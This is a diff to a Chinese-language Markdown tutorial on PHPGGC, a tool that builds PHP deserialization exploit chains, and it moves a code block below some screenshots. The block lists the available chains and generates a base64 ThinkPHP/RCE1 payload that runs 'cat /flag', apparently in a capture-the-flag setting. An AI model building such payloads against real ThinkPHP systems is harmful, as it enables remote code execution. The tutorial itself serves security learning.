@@ -131,9 +131,6 @@ PHPGGC是专门针对PHP语言开发的CMS和框架的反序列化漏洞利用�
 ![](img/c4ba44e408df6c460f91177db8a2db1e_96.png)
 
 **基本用法**：
-```bash
-# 列出所有支持的漏洞利用链
-phpggc -l
 
 ![](img/c4ba44e408df6c460f91177db8a2db1e_98.png)
 
@@ -143,6 +140,9 @@ phpggc -l
 
 ![](img/c4ba44e408df6c460f91177db8a2db1e_103.png)
 
+```bash
+# 列出所有支持的漏洞利用链
+phpggc -l
 # 生成特定利用链的Payload
 phpggc ThinkPHP/RCE1 system "cat /flag" --base64
 ```
